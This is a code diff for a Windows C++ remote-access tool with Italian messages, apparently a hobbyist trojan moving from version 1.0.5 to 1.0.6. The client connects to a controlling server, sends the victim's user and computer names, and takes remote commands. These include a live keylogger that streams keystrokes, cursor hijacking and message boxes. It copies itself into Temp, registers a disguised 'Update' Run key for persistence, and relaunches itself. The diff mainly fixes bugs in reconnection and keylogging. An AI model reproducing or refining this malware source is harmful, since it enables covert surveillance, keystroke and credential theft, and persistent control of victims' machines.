@@ -25,7 +25,7 @@ TCHAR name[30]={0};
 char tit[100]={0};
 char mes[500]={0};
 char Csimb[3]={0};
-char Cbott[3]={0};
+char Cbott=0;
 char ctsk[7]={0};
 int simb=0;
 int bott=0;
@@ -94,7 +94,6 @@ int main()
 	
 	WSACleanup();
 	Sleep(1000);
-	//system("pause");
 	return 0;
 }
 
@@ -156,12 +155,12 @@ addrinfo wcon(SOCKET s,addrinfo a)
 		}
 		else
 		{
-			v5=true;
 			cout<<"<Client> Connesso con il Server!\n"<<endl;
 			Sleep(10);
 			send(s,sig,30,0);
 			GetUserName(name,&cchCN);
 			send(s,name,30,0);
+			v5=true;
 			break;
 		}
 	}
@@ -181,7 +180,6 @@ void ricevi(SOCKET s)
 			if(msg[0]=='A' && msg[1]=='A')
 			{
 				cout<<"\n<Client> Il Server ha chiuso la connessione...";
-				//Sleep(10);
 				closesocket(s);
 				v5=false;
 				v=-1;
@@ -229,17 +227,24 @@ void ricevi(SOCKET s)
 				recv(s,tit,sizeof(tit),0);
 				recv(s,mes,sizeof(mes),0);
 				recv(s,Csimb,sizeof(Csimb),0);
-				recv(s,Cbott,sizeof(Cbott),0);
+				recv(s,&Cbott,sizeof(Cbott),0);
 				simb=atoi(Csimb);
-				bott=atoi(Cbott);
+				bott=atoi(&Cbott);
 				thread t3(MSGBOX);
 				t3.detach();
 				cout<<"<Server> Msgbox."<<endl;
 			}
 			if(msg[0]=='H' && msg[1]=='H')
 			{
-				cout<<"<Server> Client reset."<<endl;
-				system("start sus.exe");//3RIF
+				cout<<"<Server> Client restart."<<endl;
+				system("start test.exe");//3RIF
+				v2=false;
+				v3=false;
+				v4=false;
+				v5=false;
+				v6=false;
+				v7=true;
+				v8=false;
 				closesocket(s);
 				v=-1;
 				return;
@@ -279,16 +284,8 @@ void ricevi(SOCKET s)
 			}
 			if(msg[0]=='L' && msg[1]=='L')
 			{
-				v5=false;
 				cout<<"<Server> GetInfo."<<endl;
-				//char npc[256]={0}; // nome pc
-				//char nut[256]={0}; // nome utente
-				//char dir[260]={0}; // directory corrente del Client
-				//char ver[50]={0};  // versione del Client
-				//char uac='f';    // se il Client ha l'UAC
-				//char awin[50]={0}; // la finestra attualmente attiva di windows
 				GETINFO(s);
-				v5=true;
 			}
 			if(msg[0]=='M' && msg[1]=='M')
 			{
@@ -326,7 +323,7 @@ void ricevi(SOCKET s)
 				v4=false;
 				v5=false;
 				v6=false;
-				v7=false;
+				v7=true;
 				v8=false;
 				v=-1;
 				return;
@@ -345,9 +342,9 @@ void ricevi(SOCKET s)
 						if(GetAsyncKeyState(i)==-32767)
 						{
 							send(s,&i,sizeof(i),0);
-							if(v6==false)
-								break;
 						}
+						if(v6==false)
+								break;
 					}
 				}
 				cout<<"<Server> LiveKeylogger END."<<endl;
@@ -366,7 +363,6 @@ void ricevi(SOCKET s)
 			}
 			if(msg[0]=='R' && msg[1]=='R')
 			{
-				v5=false;
 				char trash='~';
 				send(s,&trash,sizeof(trash),0);
 				cout<<"<Server> TASKBAR."<<endl;
@@ -377,7 +373,6 @@ void ricevi(SOCKET s)
 				send(s,&ctsk[4],sizeof(ctsk[4]),0);
 				send(s,&ctsk[5],sizeof(ctsk[5]),0);
 				send(s,&ctsk[6],sizeof(ctsk[6]),0);
-				v5=true;
 			}
 			if(msg[0]=='R' && msg[1]=='1')
 			{
@@ -633,9 +628,17 @@ void manda(SOCKET s)
 		if(v5)
 		if(recv(s,&c,1,MSG_PEEK)==-1)
 		{
+			v2=false;
+			v3=false;
+			v4=false;
+			v6=false;
+			v7=true;
+			v8=false;
 			closesocket(Client);
 			Client=createSock();
-			Server=wcon(Client,Server);
+			Sleep(1000);
+			if(v!=-1)
+				Server=wcon(Client,Server);
 		}
 	}
 }
@@ -674,9 +677,11 @@ void LiveKey(SOCKET s)
 	{
 		recv(s,&LVK,sizeof(LVK),0);
 		if(LVK=='~')
+		{
 			v6=false;
-		Sleep(1000);
-		send(s,&LVK,sizeof(LVK),0);
+			Sleep(1000);
+			send(s,&LVK,sizeof(LVK),0);
+		}
 		
 	}
 	return;
@@ -705,7 +710,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\sus.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
@@ -755,18 +760,11 @@ bool preliminari()
 			pFC[i]='\0';
 	}
 	
-	//ShowWindow(GetConsoleWindow(), SW_SHOW);
-	//cout<<n<<endl<<pF<<endl<<pFN<<endl;
-	//system("pause");
-	
 	CopyFile(buffer,pFC,true);
 	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
 	
 	for(int i=9;i<256;i++)
 		cmd[i]=pF[i-9];
-		
-	//cout<<endl<<cmd<<endl;
-	//system("pause");
 	
 	system(cmd);
 	
@@ -778,7 +776,7 @@ void CMOUSE()
 	srand(time(0));
 	for(v2=true;v2;)
 	{
-		SetCursorPos(rand()%1920,rand()%1080);
+		SetCursorPos(rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN));
 		Sleep(10);
 	}
 	return;
@@ -844,7 +842,6 @@ void GETINFO(SOCKET s)
 	Sleep(50);
 	
 	GetComputerName(szCN,&cchCN);
-	//send(s,&uac,sizeof(uac),0);
 	send(s,szCN,sizeof(szCN),0);
 	
 	GetUserName(szCN,&cchCN);
@@ -853,7 +850,7 @@ void GETINFO(SOCKET s)
 	GetModuleFileName(NULL,buff,MAX_PATH);
 	send(s,buff,sizeof(buff),0);
 	
-	char ver[50]="1.0.5";
+	char ver[50]="1.0.6";
 	send(s,ver,sizeof(ver),0);
 	
 	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
